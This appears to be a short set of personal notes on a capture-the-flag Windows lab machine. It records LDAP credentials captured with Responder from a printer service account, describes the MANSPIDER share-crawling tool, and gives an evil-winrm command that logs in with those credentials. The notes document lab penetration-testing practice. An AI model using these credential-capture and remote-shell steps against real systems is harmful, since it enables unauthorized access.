___


windows machine

port 80 IIS server

|   |   |
|---|---|
|Server Address||
|Server Port||
|Username||
|Password||

389

svc-printer

password is 7 characters


*grabbed password with responder*
[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.10.11.108
[LDAP] Cleartext Username : return\svc-printer
[LDAP] Cleartext Password : 1edFg43012!!




*interesting tool*
### MANSPIDER

[MANSPIDER](https://github.com/blacklanternsecurity/MANSPIDER) is a tool for crawling through a share or many shares looking for certain file types and/or content. Matching content will be copied to a local folder.

Without username / password (or on failed auth), it will try the guest account and a null session.

Filenames can be filtered by extension or by a regex. A regex can also be provided for content of files to look for. Can look inside PDFs, Office documents (`.docx`, `.xlsx`, `.pptx`, etc), text-based formats, as well as images using an optional OCR install.

This tool will be less relevant for individual targets / CTFs, but for a large network, can save a ton of time.




*this worked for connecting to evil-winrm interesting*
sudo docker run --rm -it evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!' 



with the -r realm option it didn't work



